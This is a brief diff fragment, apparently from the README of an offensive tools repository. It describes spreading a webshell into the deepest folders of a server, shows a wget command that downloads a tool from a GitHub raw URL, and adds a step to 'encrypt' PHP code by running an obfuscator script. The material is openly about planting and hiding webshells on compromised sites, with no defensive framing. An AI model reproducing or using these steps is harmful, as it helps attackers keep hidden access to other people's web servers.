@@ -10,6 +10,7 @@ Spreading your webshell to the deepest destination folder
 ```sh
 wget https://raw.githubusercontent.com/haxor-research/tools/master/dor
 ```
+Encrypt ur PHP Code
 ```php
 php ob.php
 ```
